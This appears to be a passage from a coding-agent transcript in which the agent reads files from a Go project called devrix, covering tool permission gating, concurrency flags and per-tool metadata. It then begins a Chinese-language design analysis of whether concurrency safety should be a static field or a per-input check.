	"github.com/devrix/devrix/internal/layers/contextengine/enforce/tools"
	"github.com/devrix/devrix/internal/layers/contextengine/i18n"
	"github.com/devrix/devrix/internal/layers/llmgateway"
	"github.com/devrix/devrix/internal/layers/orchestration/sessionorchestrator"
	"github.com/devrix/devrix/internal/shared/contracts"
	"github.com/devrix/devrix/internal/shared/types"
)

// compressThreshold is the per-message token budget above which a CompressHint is
// generated. DM-20260621-009: raised 4000 → 32000. The old 4000 threshold
// fired prematurely on real multi-turn conversations (a 2-turn session with
// bash tool results easily exceeds 4K tokens), replacing the full prior
// history with a single summary. The LLM then lost conversational state
// like "please pick 1 or 2" — the next short reply (e.g. "2") could not
// be matched back to its antecedent. 32K stays under 25% of the default
// 128K LLM context, leaving room for system prompt, tools, response, and
// tool results.
const compressThreshold = 32000

// contextEngineAdapter implements sessionorchestrator.ContextPreparer, sessionorchestrator.ToolRoundExecutor,
// and sessionorchestrator.SessionPersister by delegating to the context engine internals.
//
// DM-020 D-c+d+e: temporary adapter that bridges orchestration interfaces to
// the existing context engine. Token counter (D-e) enables CompressHint generation.
//
// TOOL-SURFACE-1 W9: ExecuteRound routes tool calls through the engine's
// surface list when available (TOOL-SURFACE-1-A03 dispatch path) and
// falls back to the legacy IToolRunner when the engine was built without
// surfaces (phase-1 back-compat).
//
// TOOL-SURFACE-1-A02 (DM-20260618-003 devrix-surface-lazy-loading):
// the adapter filters out DeferLoading=true specs from the LLM prompt
// (tool_search is exempt) and consults an optional DeferDecision chain
// (e.g. PlanModeOpenWorldPolicy) for runtime defer signals.
type contextEngineAdapter struct {
	gw           *capture.CommunicationGateway
	engine       contracts.IEngine
	tools        contextengine.IToolRunner
	toolsReg     contextengine.IToolRegistry
	perm         contracts.IPermissionGate
	counter      contracts.ITokenCounter
	surfaces     []contracts.ToolSurface
	deferDecider contracts.DeferDecision
}

func newContextEngineAdapter(gw *capture.CommunicationGateway, engine contracts.IEngine, counter contracts.ITokenCounter) *contextEngineAdapter {
	a := &contextEngineAdapter{
		gw: gw, engine: engine, counter: counter,

exec
/bin/zsh -lc 'ls /Users/fukai/workspace/devrix/internal/layers/contextengine/enforce/tools/bash/ 2>/dev/null' in /Users/fukai/workspace/devrix
 succeeded in 0ms:
heredoc.go
parser.go
parser_test.go
policy.go
zsh_rules.go

exec
/bin/zsh -lc "grep -n \"ConcurrencySafe\\|IsConcurrencySafe\\|ExecuteRound\\|partition\" /Users/fukai/workspace/devrix/internal/bootstrap/turn_adapter.go | head -40" in /Users/fukai/workspace/devrix
 succeeded in 0ms:
38:// TOOL-SURFACE-1 W9: ExecuteRound routes tool calls through the engine's
253:// ExecuteRound implements sessionorchestrator.ToolRoundExecutor.
277:// tool calls marked ConcurrencySafe=true on their ToolSpec run in
285:// ExecuteRound runs a 2-phase dispatch:
295:func (a *contextEngineAdapter) ExecuteRound(ctx context.Context, req sessionorchestrator.ToolRoundRequest) (sessionorchestrator.ToolRoundResult, error) {
456:// concurrencyMap builds a toolName → ConcurrencySafe lookup from the
458:// (sequential). Used by ExecuteRound to decide parallel vs sequential
469:			m[sp.Name] = sp.ConcurrencySafe

exec
/bin/zsh -lc 'ls /Users/fukai/workspace/devrix/internal/layers/contextengine/enforce/tools/' in /Users/fukai/workspace/devrix
 succeeded in 0ms:
bash
context.go
contracts.go
doc.go
edit_tool.go
filter
freefork_dto.go
freefork_surface_test.go
glob_tool.go
grep_tool.go
input.go
lsp_tool.go
lsp_tool_test.go
plan_write.go
sandbox.go
sandbox_shortstack_test.go
sandbox_test.go
sandboxast
surface
todo_tool.go
tool_limiter.go
tool_limiter_test.go
tool_plugin.go
tool_plugin_test.go
tool_runner.go
tool_runner_ast_test.go
tool_runner_offset_test.go
tool_runner_symlink_test.go
tool_runner_test.go
tracker_surface_test.go
zodgen

exec
/bin/zsh -lc "grep -n \"sibling\\|Sibling\\|discard\\|Discard\\|fallback\" /Users/fukai/workspace/devrix/openspec/tech-debt/streaming-tool-executor-v2.md | head -20" in /Users/fukai/workspace/devrix
 succeeded in 0ms:
14:| TD-STE-02 | Bash sibling abort | **CLOSED** by DM-20260702-009 **T26** (siblingAbortController) | 走 PR-F |
15:| TD-STE-03 | fallback 时 discard 在途工具 | **CLOSED** by DM-20260702-009 **T27** (StreamingToolExecutor.Discard) | 走 PR-F (依赖 TD-QL-03 CLOSED, DM-20260618-010) |
23:clawcode 支持 **混合批次**（只读工具并行 + 写工具独占）、并行 Bash 兄弟取消、fallback discard、执行中 progress 流式输出。
30:| Bash 并行 sibling abort | 无 | `siblingAbortController` | **TD-STE-02 → CLOSED T26** |
31:| fallback 时 discard 在途工具 | 无 | `discard()` + synthetic error | **TD-STE-03 → CLOSED T27** |
33:| 合成 error 类型 | permission/exec | sibling_error / interrupted / streaming_fallback | TD-STE-05 保留 P2 |
53:### TD-STE-02: Bash sibling abort — CLOSED by T26
57:**关闭路径:** DM-20260702-009 T26 BashTool siblingAbortController 集成
58:- `internal/layers/contextengine/enforce/tools/bash/sibling_abort.go` 新建
64:**回归基线:** `sibling_abort_test.go` — mock 双 Bash, 第一个 error → 第二个 cancelled
66:### TD-STE-03: discard on fallback — CLOSED by T27
68:**触发:** QueryLoop fallback model 切换前 (依赖 TD-QL-03)
70:**关闭路径:** DM-20260702-009 T27 StreamingToolExecutor.Discard() + fallback 路径 wiring
71:- `internal/bootstrap/streaming_executor.go` 新建 — Discard() 方法
72:- `internal/bootstrap/discard_on_fallback.go` 新建 — QueryLoop fallback 路径 wiring
73:- 在途/queued 工具注入 `streaming_fallback` synthetic result
80:**回归基线:** `discard_on_fallback_test.go` — fallback 路径无 orphan tool_use
109:| `sibling_error` | 并行兄弟失败取消 |
111:| `streaming_fallback` | 模型 fallback 丢弃在途 |
132:- 单测 fallback 路径无 orphan tool_use

exec
/bin/zsh -lc "sed -n '253,460p' /Users/fukai/workspace/devrix/internal/bootstrap/turn_adapter.go" in /Users/fukai/workspace/devrix
 succeeded in 0ms:
// ExecuteRound implements sessionorchestrator.ToolRoundExecutor.
//
// DM-20260617-004 (devrix-d7-tool-ctx-inject): D7 path doesn't go through
// D2 queryloop's WrapToolContext hook, so the live SessionContext (and its
// SessionID/WorkDir) never reaches permission-aware tool runners
// (delegate_status, task_output, task_list_background). Without it, those
// tools return "session context unavailable" / "session_id unavailable".
// Mirror D2's ToolContextWithGate here so D7→D2 tool dispatch behaves the
// same as the legacy D2 path.
//
// DM-20260617-006 (devrix-tool-pipeline-permission): close the D2→D7 拆面
// gap on tool permission. D2 legacy path (query/executor.go:50) already
// gates via permChecker.Request; the D7 turn adapter used to skip this
// check, leaving all tools auto-approved in plan_mode and outside YOLO.
// Now call IPermissionGate.Request with the looked-up risk before
// a.tools.Execute, and propagate the risk into contextengine.ToolCall so
// downstream runners can read the policy classification.
//
// TOOL-SURFACE-1 W9: when the engine has a non-nil surface list, findSurface
// dispatches each tool call to the matching surface.Execute. The legacy
// IToolRunner path is still used when surfaces are absent (phase-1
// back-compat) or for a tool name that no surface claims.
//
// TOOL-SURFACE-1-A01-F06 (DM-20260618-001 devrix-tool-spec-enrichment):
// tool calls marked ConcurrencySafe=true on their ToolSpec run in
// parallel via errgroup; the rest run sequentially. The permission
// gate is consulted INSIDE executeOne so the gate mutex is held only
// for the gate call (the gate is a shared, sequential resource). The
// results slice is pre-allocated and indexed so the order of
// req.ToolCalls is preserved in the output.
//
// TOOL-SURFACE-1-A01-F07 (DM-20260618-002 devrix-surface-permission-extension):
// ExecuteRound runs a 2-phase dispatch:
//
//	Phase 1: for each tool call, consult surface.CheckPermission. If
//	  the surface returns Deny or Ask, the result is set immediately
//	  (PermissionDeniedError / PermissionAskRequiredError) and the
//	  tool is NOT executed. Ask delegates to IPermissionGate.CheckPermission
//	  for the final policy decision (plan-mode OpenWorld denial goes
//	  through this path).
//	Phase 2: parallel / sequential dispatch of the remaining
//	  Allow tools, identical to DM-001 F06.
func (a *contextEngineAdapter) ExecuteRound(ctx context.Context, req sessionorchestrator.ToolRoundRequest) (sessionorchestrator.ToolRoundResult, error) {
	if a.tools == nil && len(a.surfaces) == 0 {
		return sessionorchestrator.ToolRoundResult{}, fmt.Errorf("turn adapter: tool runner not available")
	}

	toolCtx := tools.WithPromptLocale(ctx, a.promptLocale())
	if req.SessionID != "" {
		if sc, ok := contracts.SubAgentSessionFromContext(ctx); ok {
			toolCtx = contextengine.ToolContextWithGate(toolCtx, sc, a.perm)
		} else if prov, ok := a.engine.(sessionContextProvider); ok {
			if sc, ok := prov.SessionContext(req.SessionID); ok && sc != nil {
				toolCtx = contextengine.ToolContextWithGate(toolCtx, sc, a.perm)
			}
		}
	}

	concSafe := a.concurrencyMap()
	results := make([]sessionorchestrator.ToolResult, len(req.ToolCalls))

	// Phase 1: CheckPermission pre-dispatch (DM-002 F07).
	for i, tc := range req.ToolCalls {
		if r, denied := a.checkPermission(toolCtx, req.SessionID, tc); denied {
			results[i] = r
		}
	}

	// Phase 2: execute the surviving calls in parallel / sequential.
	var parallelIdx []int
	for i, tc := range req.ToolCalls {
		if results[i].Error != "" {
			continue // already denied in Phase 1
		}
		if concSafe[tc.Name] {
			parallelIdx = append(parallelIdx, i)
			continue
		}
		results[i] = a.executeOne(toolCtx, req.SessionID, tc)
	}

	if len(parallelIdx) > 0 {
		var g errgroup.Group
		for _, idx := range parallelIdx {
			idx, tc := idx, req.ToolCalls[idx]
			g.Go(func() error {
				results[idx] = a.executeOne(toolCtx, req.SessionID, tc)
				return nil
			})
		}
		_ = g.Wait()
	}

	return sessionorchestrator.ToolRoundResult{Results: results}, nil
}

// checkPermission runs surface.CheckPermission → IPermissionGate.CheckPermission
// and returns the appropriate ToolResult + denied=true when the tool
// should NOT be executed. Returns (_, false) when the call should
// proceed to Phase 2.
//
// TOOL-SURFACE-1-A01-F07 (DM-20260618-002).
func (a *contextEngineAdapter) checkPermission(toolCtx context.Context, sessionID string, tc llmgateway.ToolCall) (sessionorchestrator.ToolResult, bool) {
	surf, ok := a.findSurface(tc.Name)
	if !ok {
		return sessionorchestrator.ToolResult{}, false
	}
	spec, _ := a.findSpec(toolCtx, tc.Name)
	var specVal contracts.ToolSpec
	if spec != nil {
		specVal = *spec
	}
	decision := surf.CheckPermission(toolCtx, specVal, json.RawMessage(tc.Input))
	if decision == contracts.DecisionAllow {
		return sessionorchestrator.ToolResult{}, false
	}
	if decision == contracts.DecisionAsk && a.perm != nil {
		decision = a.perm.CheckPermission(toolCtx, specVal)
	}
	if decision == contracts.DecisionAllow {
		return sessionorchestrator.ToolResult{}, false
	}
	reason := ""
	switch decision {
	case contracts.DecisionDeny:
		reason = "policy denied"
	case contracts.DecisionAsk:
		reason = "ask required"
	}
	if decision == contracts.DecisionDeny {
		return sessionorchestrator.ToolResult{
			ToolCallID: tc.ID,
			Error: (&contracts.PermissionDeniedError{
				Spec:   specVal,
				Input:  json.RawMessage(tc.Input),
				Reason: reason,
			}).Error(),
		}, true
	}
	return sessionorchestrator.ToolResult{
		ToolCallID: tc.ID,
		Error: (&contracts.PermissionAskRequiredError{
			Spec:   specVal,
			Input:  json.RawMessage(tc.Input),
			Reason: reason,
		}).Error(),
	}, true
}

// findSpec looks up the ToolSpec for a tool name across all surfaces.
// Returns (nil, false) when no surface claims the tool.
func (a *contextEngineAdapter) findSpec(ctx context.Context, name string) (*contracts.ToolSpec, bool) {
	for _, s := range a.surfaces {
		if s == nil {
			continue
		}
		for _, sp := range s.Tools(ctx, "", "") {
			if sp.Name == name {
				return &sp, true
			}
		}
	}
	return nil, false
}

// executeOne runs the full gate → surface → fallback chain for a single
// tool call. Shared by both the sequential and parallel dispatch paths.
func (a *contextEngineAdapter) executeOne(toolCtx context.Context, sessionID string, tc llmgateway.ToolCall) sessionorchestrator.ToolResult {
	// DM-20260617-006: gate via IPermissionGate (suggestion 3) and
	// propagate risk into the D2 ToolCall (suggestion 4 partial). When
	// a.perm is nil we leave the gate open — adapter is shared with
	// tests/mocks that don't wire permission state.
	risk := a.riskForTool(tc.Name)
	if a.perm != nil && !a.perm.Request(toolCtx, sessionID, tc.Name, tc.Input, risk) {
		return sessionorchestrator.ToolResult{ToolCallID: tc.ID, Error: "permission denied"}
	}
	// TOOL-SURFACE-1 (W9): prefer surface dispatch when available.
	if surf, ok := a.findSurface(tc.Name); ok {
		res, err := surf.Execute(toolCtx, tc.Name, tc.Input, "")
		if err != nil {
			return sessionorchestrator.ToolResult{ToolCallID: tc.ID, Error: err.Error()}
		}
		return sessionorchestrator.ToolResult{ToolCallID: tc.ID, Output: res.Output, Error: res.Error}
	}
	// Fall back to the legacy IToolRunner path (W11 removes this).
	if a.tools == nil {
		return sessionorchestrator.ToolResult{
			ToolCallID: tc.ID,
			Error:      fmt.Sprintf("turn adapter: no surface or runner for tool %q", tc.Name),
		}
	}
	result, err := a.tools.Execute(toolCtx, contextengine.ToolCall{
		ID:        tc.ID,
		Name:      tc.Name,
		Input:     tc.Input,
		RiskLevel: risk,
	})
	if err != nil {
		return sessionorchestrator.ToolResult{ToolCallID: tc.ID, Error: err.Error()}
	}
	return sessionorchestrator.ToolResult{ToolCallID: tc.ID, Output: result.Output, Error: result.Error}
}

// concurrencyMap builds a toolName → ConcurrencySafe lookup from the
// surface list. Tools not declared by any surface default to false
// (sequential). Used by ExecuteRound to decide parallel vs sequential
// dispatch.
//

exec
/bin/zsh -lc 'ls /Users/fukai/workspace/devrix/internal/layers/contextengine/enforce/tools/surface/' in /Users/fukai/workspace/devrix
 succeeded in 0ms:
ask_user_question_surface.go
ask_user_question_surface_test.go
background_task_surface.go
bash_ast.go
bash_ast_test.go
bash_surface_invariant.go
builtin_surface.go
builtin_surface_test.go
delegate_surface.go
freefork_surface.go
lsp_surface_invariant.go
lsp_surface_invariant_test.go
lsptool_surface.go
lsptool_surface_test.go
orthogonal_flags.go
orthogonal_flags_test.go
plugin_surface.go
surface_metadata_gate_test.go
tool_search_surface.go
tool_search_surface_test.go
tracker_surface.go
verify_surface.go
w4_surfaces_test.go
w5_surfaces_test.go

exec
/bin/zsh -lc 'cat /Users/fukai/workspace/devrix/internal/layers/contextengine/enforce/tools/surface/orthogonal_flags.go' in /Users/fukai/workspace/devrix
 succeeded in 0ms:
package surface

import (
	"context"
	"encoding/json"

	"github.com/devrix/devrix/internal/shared/contracts"
)

// OrthogonalFlags is the 4-bool truth table for each tool name in devrix
// (TOOL-SURFACE-1-A01-F02 — DM-20260618-001 devrix-tool-spec-enrichment).
//
// Each entry is the authoritative classification that the corresponding
// surface MUST apply to its ToolSpec. The hard-coded table is intentional:
// it keeps the surface code mechanical and the S3-Gate review a 1:1
// diff against design.md §2.1.2.
//
// Truth table (column = flag, row = tool name):
//
//	tool_name    | ReadOnly | Destructive | OpenWorld | ConcurrencySafe
//	-------------+----------+-------------+-----------+----------------
//	read_file    |    Y     |      N      |     N     |       Y
//	write_file   |    N     |      Y      |     N     |       N
//	edit_file    |    N     |      Y      |     N     |       N
//	bash         |    N     |      Y      |     N     |       Y
//	grep         |    Y     |      N      |     N     |       Y
//	glob         |    Y     |      N      |     N     |       Y
//	lsp          |    Y     |      N      |     N     |       N
//	free_fork    |    N     |      N      |     Y     |       N
//	query_diagnostics | Y   |      N      |     N     |       Y
//	verify_plan_execution | Y |    N      |     N     |       N
//	delegate_*   |    N     |      N      |     Y     |       N
//	task_output  |    Y     |      N      |     N     |       Y
//	ask_user_question | Y  |      N      |     Y     |       N
//
// Tools not in the table get all-false (the conservative default; the
// surface MUST still emit a non-zero bool combination, so callers SHOULD
// extend this map when adding new tools).
type orthogonalFlags = contracts.ToolSpec // alias for the 4 bools

// OrthogonalFlagFor returns the 4 bool flags for a given tool name.
// Falls back to all-false for unknown names; this matches the design's
// "conservative default" rule (T22 assertion: at least one bool must be true).
func OrthogonalFlagFor(toolName string) (readOnly, destructive, openWorld, concurrencySafe bool) {
	switch toolName {
	case "read_file":
		return true, false, false, true
	case "write_file":
		return false, true, false, false
	case "edit_file":
		return false, true, false, false
	case "bash":
		return false, true, false, true
	case "grep":
		return true, false, false, true
	case "glob":
		return true, false, false, true
	case "lsp",
		"lsp_go_to_definition",
		"lsp_find_references",
		"lsp_incoming_calls",
		"lsp_hover",
		"lsp_workspace_symbol":
		return true, false, false, false
	case "free_fork":
		return false, false, true, false
	case "query_diagnostics":
		return true, false, false, true
	case "ask_user_question":
		return true, false, true, false
	case "verify_plan_execution":
		return true, false, false, false
	}
	// delegate_*, task_output, etc. follow a "spawn-agents" / "read-result"
	// rule below.
	switch {
	case hasPrefix(toolName, "delegate_"):
		return false, false, true, false
	case toolName == "task_output" || hasPrefix(toolName, "task_"):
		return true, false, false, true
	}
	return false, false, false, false
}

// InterruptBehaviorFor returns the InterruptMode for a given tool name.
// Only long-run tools (free_fork, delegate_*, ask_user_question) opt
// into InterruptCancel. Everything else (and unknown names) is
// InterruptBlock.
//
// TOOL-SURFACE-1-A01-F05 (DM-20260618-001): the surface MUST return this
// from InterruptBehavior and (for InterruptCancel) select on ctx.Done()
// inside Execute.
//
// ask_user_question (DM-20260618-006) opts into InterruptCancel so the
// D7 runLoop can abort a pending question when the user issues a new
// message mid-turn.
func InterruptBehaviorFor(toolName string) contracts.InterruptMode {
	switch toolName {
	case "free_fork", "ask_user_question":
		return contracts.InterruptCancel
	}
	if hasPrefix(toolName, "delegate_") {
		return contracts.InterruptCancel
	}
	return contracts.InterruptBlock
}

func hasPrefix(s, prefix string) bool {
	if len(s) < len(prefix) {
		return false
	}
	return s[:len(prefix)] == prefix
}

// ShouldDeferByDefault returns true for tools whose full schema is omitted
// from the default system prompt and must be retrieved on demand via
// tool_search. The 6 hardcoded candidates are:
//   - delegate_* (5: delegate_explore / delegate_status / delegate_status_all
//     / delegate_plan / delegate_research) — spawns child agent, rarely
//     invoked outside plan-mode finalization.
//   - task_output_background (1: suffix match) — polling helper, low value.
//
// tool_search itself MUST always return false (otherwise deadlock).
//
// DSAFT: TOOL-SURFACE-1-A01-F08 (DM-20260618-003 devrix-surface-lazy-loading).
func ShouldDeferByDefault(toolName string) bool {
	if toolName == "tool_search" {
		return false
	}
	if hasPrefix(toolName, "delegate_") {
		return true
	}
	if hasPrefix(toolName, "task_") && toolName == "task_output_background" {
		return true
	}
	// Also catch `*_background` suffix generally (defensive for future tools).
	if len(toolName) > len("_background") &&
		toolName[len(toolName)-len("_background"):] == "_background" {
		return true
	}
	return false
}

// AllowAllCheckPermission is the default CheckPermission implementation
// for surfaces without per-tool policy. It returns DecisionAllow
// unconditionally. ToolSurface implementations can embed
// allowAllChecker to satisfy the interface with one line.
//
// DSAFT: TOOL-SURFACE-1-A01-F07 (DM-20260618-002 — see PR #68 for full
// integration; here we provide the helper so every surface compiles
// under the ToolSurface v2 contract).
type allowAllChecker struct{}

func (allowAllChecker) CheckPermission(_ context.Context, _ contracts.ToolSpec, _ json.RawMessage) contracts.Decision {
	return contracts.DecisionAllow
}

// --- ToolSpec v3 control plane metadata (D2-S15-A02-T08) -----------------
//
// DefaultV3MetadataFor returns the 6 control plane fields for the named
// tool. DSAFT: D2-S15-A02-T08 (19 tools explicit default metadata — the
// 治本 narrative MUST NOT defer to a Phase E migration).
//
// The returned tuple is the per-tool truth table for the 6 v3 fields.
// T14 (surface_metadata_gate_test.go) enforces that every registered
// surface's Tools() returns specs whose v3 fields are non-default
// (i.e., DefaultV3MetadataFor has been applied with the correct name).
//
// Naming convention:
//   read_file / grep / glob   → Probe + Bounded(15)  (H12 consensus:
//                              "re-read in self-loop recovery" is Probe)
//   write_file/edit_file/bash → Action + StateChangeRequired
//   lsp_*                     → Fact for read-only methods, Probe for
//                              workspace_symbol / code_action
//   free_fork                 → Experiment + Quotient(0.8)
//   delegate_*                → Probe + EvidenceRequired(min=1) + Bounded(3)
//   task_*                    → Action + Bounded(n) per tool
func DefaultV3MetadataFor(toolName string) (contracts.EmissionClass, contracts.ConvergenceContract, contracts.IterationBound, contracts.SourceUncertainty, int, string) {
	const (
		// Per-tool persistence thresholds (DM-20260702-008 / D2-S15-A02-T07).
		// Mirrors clawcode DEFAULT_MAX_RESULT_SIZE_CHARS = 50_000 +
		// per-tool overrides. We keep them per-tool because the LLM's
		// recovery style varies — Read re-reads via offset/limit so 8K is
		// fine, Bash output is re-issued so 30K is the sweet spot, etc.
		//
		// The growthbook override (persist.GetPersistenceThreshold) can
		// shift individual tools up or down at runtime without recompile.
		maxCharsReadFile        = 8 * 1024   // 8K  — Read re-reads via offset/limit
		maxCharsGrepGlob        = 20 * 1024  // 20K — match clawcode grep/glob
		maxCharsBash            = 30 * 1024  // 30K — bash output re-issued
		maxCharsEditWrite       = 100 * 1024 // 100K — Edit/Write/NotebookEdit/Web*/LSP/Agent/Task/Plan
		maxCharsMCPAuth         = 10 * 1024  // 10K — MCP auth responses
		maxCharsAskUserQuestion = 4 * 1024   // 4K  — small UX surface
		maxCharsToolSearch      = 4 * 1024   // 4K  — list-of-tools response
		maxCharsLSPRead         = 4 * 1024   // 4K  — go-to-def / hover / etc.
		maxCharsTaskStop        = 2 * 1024   // 2K  — control message
	)
	marker := contracts.DefaultTruncateMarkerText

	switch toolName {
	case "read_file":
		return contracts.EC_Probe,
			contracts.ConvergenceContract{Kind: contracts.CC_None},
			// DM-20260702-008 / D2-S15-A02-T11: read_file is the recovery
			// path (offset/limit re-reads, T10). OpenEnded is correct
			// because the LLM uses Read to recover from oversized
			// results, NOT to discover content. The bound is preserved
			// as MaxN for dashboards but the channel no longer hard-rejects.
			contracts.IterationBound{Kind: contracts.IB_OpenEnded},
			contracts.SourceUncertainty{Source: contracts.SK_Deterministic, Value: 1.0},
			maxCharsReadFile, marker
	case "write_file":
		return contracts.EC_Action,
			contracts.ConvergenceContract{Kind: contracts.CC_StateChangeRequired},
			contracts.IterationBound{Kind: contracts.IB_Bounded, MaxN: 8},
			contracts.SourceUncertainty{Source: contracts.SK_User, Value: 0.85},
			maxCharsEditWrite, marker
	case "edit_file":
		return contracts.EC_Action,
			contracts.ConvergenceContract{Kind: contracts.CC_StateChangeRequired},
			contracts.IterationBound{Kind: contracts.IB_Bounded, MaxN: 8},
			contracts.SourceUncertainty{Source: contracts.SK_User, Value: 0.85},
			maxCharsEditWrite, marker
	case "bash":
		return contracts.EC_Action,
			contracts.ConvergenceContract{Kind: contracts.CC_StateChangeRequired},
			contracts.IterationBound{Kind: contracts.IB_Bounded, MaxN: 10},
			contracts.SourceUncertainty{Source: contracts.SK_User, Value: 0.85},
			maxCharsBash, marker
	case "grep":
		return contracts.EC_Probe,
			contracts.ConvergenceContract{Kind: contracts.CC_None},
			// T11: OpenEnded — see read_file above.
			contracts.IterationBound{Kind: contracts.IB_OpenEnded},
			contracts.SourceUncertainty{Source: contracts.SK_Deterministic, Value: 1.0},
			maxCharsGrepGlob, marker
	case "glob":
		return contracts.EC_Probe,
			contracts.ConvergenceContract{Kind: contracts.CC_None},
			// T11: OpenEnded — see read_file above.
			contracts.IterationBound{Kind: contracts.IB_OpenEnded},
			contracts.SourceUncertainty{Source: contracts.SK_Deterministic, Value: 1.0},
			maxCharsGrepGlob, marker
	case "query_diagnostics":
		return contracts.EC_Fact,
			contracts.ConvergenceContract{Kind: contracts.CC_None},
			contracts.IterationBound{Kind: contracts.IB_OpenEnded},
			contracts.SourceUncertainty{Source: contracts.SK_Deterministic, Value: 1.0},
			maxCharsEditWrite, marker
	case "verify_plan_execution":
		return contracts.EC_Action,
			contracts.ConvergenceContract{Kind: contracts.CC_StateChangeRequired},
			contracts.IterationBound{Kind: contracts.IB_Bounded, MaxN: 3},
			contracts.SourceUncertainty{Source: contracts.SK_Deterministic, Value: 1.0},
			maxCharsEditWrite, marker
	case "ask_user_question":
		return contracts.EC_Action,
			contracts.ConvergenceContract{Kind: contracts.CC_None},
			contracts.IterationBound{Kind: contracts.IB_Bounded, MaxN: 2},
			contracts.SourceUncertainty{Source: contracts.SK_User, Value: 0.85},
			maxCharsAskUserQuestion, marker
	case "tool_search":
		return contracts.EC_Fact,
			contracts.ConvergenceContract{Kind: contracts.CC_None},
			contracts.IterationBound{Kind: contracts.IB_OpenEnded},
			contracts.SourceUncertainty{Source: contracts.SK_LLM, Value: 0.4},
			maxCharsToolSearch, marker
	case "lsp_go_to_definition", "lsp_find_references", "lsp_incoming_calls", "lsp_hover":
		return contracts.EC_Fact,
			contracts.ConvergenceContract{Kind: contracts.CC_None},
			contracts.IterationBound{Kind: contracts.IB_OpenEnded},
			contracts.SourceUncertainty{Source: contracts.SK_Deterministic, Value: 1.0},
			maxCharsLSPRead, marker
	case "lsp_workspace_symbol":
		return contracts.EC_Probe,
			contracts.ConvergenceContract{Kind: contracts.CC_None},
			contracts.IterationBound{Kind: contracts.IB_Bounded, MaxN: 5},
			contracts.SourceUncertainty{Source: contracts.SK_LLM, Value: 0.4},
			maxCharsLSPRead, marker
	case "lsp_code_action":
		return contracts.EC_Probe,
			contracts.ConvergenceContract{Kind: contracts.CC_None},
			contracts.IterationBound{Kind: contracts.IB_Bounded, MaxN: 3},
			contracts.SourceUncertainty{Source: contracts.SK_LLM, Value: 0.4},
			maxCharsLSPRead, marker
	case "free_fork":
		return contracts.EC_Experiment,
			contracts.ConvergenceContract{Kind: contracts.CC_QuotientThreshold, Threshold: 0.8},
			contracts.IterationBound{Kind: contracts.IB_Quotient, Quotient: 0.8},
			contracts.SourceUncertainty{Source: contracts.SK_User, Value: 0.85},
			maxCharsEditWrite, marker
	case "task_output":
		return contracts.EC_Action,
			contracts.ConvergenceContract{Kind: contracts.CC_None},
			contracts.IterationBound{Kind: contracts.IB_Bounded, MaxN: 5},
			contracts.SourceUncertainty{Source: contracts.SK_Deterministic, Value: 1.0},
			maxCharsEditWrite, marker
	case "task_stop":
		return contracts.EC_Action,
			contracts.ConvergenceContract{Kind: contracts.CC_StateChangeRequired},
			contracts.IterationBound{Kind: contracts.IB_Bounded, MaxN: 1},
			contracts.SourceUncertainty{Source: contracts.SK_User, Value: 0.85},
			maxCharsTaskStop, marker
	case "task_list_background":
		return contracts.EC_Action,
			contracts.ConvergenceContract{Kind: contracts.CC_None},
			contracts.IterationBound{Kind: contracts.IB_Bounded, MaxN: 3},
			contracts.SourceUncertainty{Source: contracts.SK_Deterministic, Value: 1.0},
			maxCharsEditWrite, marker
	case "task_output_background":
		return contracts.EC_Action,
			contracts.ConvergenceContract{Kind: contracts.CC_None},
			contracts.IterationBound{Kind: contracts.IB_Bounded, MaxN: 3},
			contracts.SourceUncertainty{Source: contracts.SK_Deterministic, Value: 1.0},
			maxCharsEditWrite, marker
	}

	// Pattern-based fallbacks (delegate_*, task_*, lsp_*).
	if hasPrefix(toolName, "delegate_") {
		return contracts.EC_Probe,
			contracts.ConvergenceContract{Kind: contracts.CC_EvidenceRequired, MinEvidence: 1},
			contracts.IterationBound{Kind: contracts.IB_Bounded, MaxN: 3},
			contracts.SourceUncertainty{Source: contracts.SK_LLM, Value: 0.4},
			maxCharsEditWrite, marker
	}
	if hasPrefix(toolName, "task_") {
		return contracts.EC_Action,
			contracts.ConvergenceContract{Kind: contracts.CC_None},
			contracts.IterationBound{Kind: contracts.IB_Bounded, MaxN: 3},
			contracts.SourceUncertainty{Source: contracts.SK_Deterministic, Value: 1.0},
			maxCharsEditWrite, marker
	}
	if hasPrefix(toolName, "lsp_") {
		return contracts.EC_Fact,
			contracts.ConvergenceContract{Kind: contracts.CC_None},
			contracts.IterationBound{Kind: contracts.IB_OpenEnded},
			contracts.SourceUncertainty{Source: contracts.SK_Deterministic, Value: 1.0},
			maxCharsLSPRead, marker
	}

	// Unknown tool name — T14 gate will fail the build. Returning the
	// zero defaults lets a fresh ToolSpec compile cleanly; the gate
	// prevents any registered surface from hitting this path.
	return contracts.EC_Action,
		contracts.ConvergenceContract{Kind: contracts.CC_None},
		contracts.IterationBound{Kind: contracts.IB_OpenEnded},
		contracts.SourceUncertainty{Source: contracts.SK_Deterministic, Value: 0.0},
		0, ""
}

// ApplyV3Metadata fills the 6 ToolSpec v3 control plane fields on the
// given spec from DefaultV3MetadataFor. Surface implementations call
// this once per tool after constructing the v2 9-field spec.
//
// DSAFT: D2-S15-A02-T08 (truth table) + T09/T10/T11 (surface call sites)
// + T14 (gate test forbids any registered spec from skipping this call).
func ApplyV3Metadata(spec *contracts.ToolSpec, toolName string) {
	ec, cc, ib, su, max, marker := DefaultV3MetadataFor(toolName)
	spec.EmissionClass = ec
	spec.ConvergenceContract = cc
	spec.IterationBound = ib
	spec.SourceUncertainty = su
	spec.MaxResultSizeChars = max
	spec.TruncateMarkerText = marker
}

exec
/bin/zsh -lc 'cat /Users/fukai/workspace/devrix/internal/bootstrap/streaming_executor.go 2>/dev/null | head -80' in /Users/fukai/workspace/devrix
 succeeded in 0ms:
codex
Now I have all the source material I need. Let me write the independent game theory analysis.

---

# 独立博弈论分析 — DM-20260702-009
**分析师:** Codex (独立立场，非 Claude)
**日期:** 2026-07-02
**核心态度:** **务实保守派** — 接受治本思路，但质疑 P0 scope 膨胀；clawcode 借鉴需工程代价核算

---

## 博弈点 1: `IsConcurrencySafe(input)` 函数 vs. 静态字段

### 立场: **分层混合方案**（与 Claude 全函数化立场分歧）

**我支持：**
- `ToolSurface` interface v4 加 `IsConcurrencySafe(input []byte) bool` 新方法（`tool_surface.go` 当前 line 39 的 `ConcurrencySafe bool` **保留不删**）
- 默认实现：所有非 Bash 工具 → `return ConcurrencySafe`（`orthogonal_flags.go:43` 静态值），零 per-input 代价
- 仅 BashTool override：`IsConcurrencySafe` → 内部调用 `isReadOnly(command)`（解析 command tree）

**理由（file 引用）：**

- `orthogonal_flags.go:43` 当前 switch/case 覆盖 13 种工具名，全部是**静态安全或不安全**。read_file/grep/glob/lsp/write_file/edit_file 在输入维度上无并发语义差异。
